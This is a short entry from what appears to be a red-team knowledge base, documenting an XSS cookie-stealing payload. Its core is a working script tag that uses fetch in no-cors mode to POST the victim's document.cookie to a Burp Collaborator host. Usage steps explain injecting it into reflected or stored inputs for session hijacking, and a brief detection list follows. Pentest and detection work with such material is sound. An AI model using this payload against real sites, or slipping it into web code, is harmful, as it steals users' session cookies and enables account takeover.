---
type: code
language: html
verified: true
created_at: '2023-04-06T03:56:41.665255+00:00'
updated_at: '2023-04-10T20:21:29.221878+00:00'
tags:
  - xss
  - cookie-theft
  - payload
platforms:
  - Web
validated: true
---

# XSS-Cookie-Exfiltration-Script

## Code

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

## Description

This HTML/JavaScript payload uses the Fetch API to send the victim's document.cookie to a Burp Collaborator server via a CORS-bypassing POST request. It executes in the context of an XSS vulnerability, exfiltrating session cookies without alerting the user. The no-cors mode allows the request even if the target domain blocks cross-origin requests.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <SESSION> | Unique Burp Collaborator session identifier (subdomain) | abc123 |

## Usage

Inject this script into a vulnerable web application input (e.g., reflected in search results or stored in user profiles). When a victim views the page, the script runs in their browser, sending cookies to https://<SESSION>.burpcollaborator.net. Monitor Burp Collaborator for incoming requests to retrieve the data. Used in red team engagements for session hijacking during web app pentests.

## Detection

- Web application logs showing unescaped script tags in inputs.
- Network monitoring for outbound POST requests to unknown domains like burpcollaborator.net.
- Browser developer tools revealing Fetch API calls with document.cookie.
- CSP violations or WAF alerts for XSS patterns.
- Anomaly detection in session logs for sudden cookie exfiltration.

## Related

- [[procedures/XSS-Cookie-Theft-Using-Burp-Collaborator]]
- [[tools/Burp-Suite]]
